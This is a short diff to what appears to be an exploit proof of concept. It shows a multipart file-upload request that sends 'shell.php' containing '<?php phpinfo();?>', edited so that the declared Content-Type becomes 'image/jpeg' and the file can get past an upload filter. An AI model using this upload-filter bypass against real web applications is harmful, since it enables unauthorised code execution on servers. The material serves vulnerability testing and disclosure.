@@ -49,7 +49,7 @@ exploit:
 	
 	-----------------------------140872878228742
 	Content-Disposition: form-data; name="upfile"; filename="shell.php"
-	Content-Type: application/octet-stream
+	Content-Type: image/jpeg
 	
 	<?php phpinfo();?>
 	-----------------------------140872878228742--
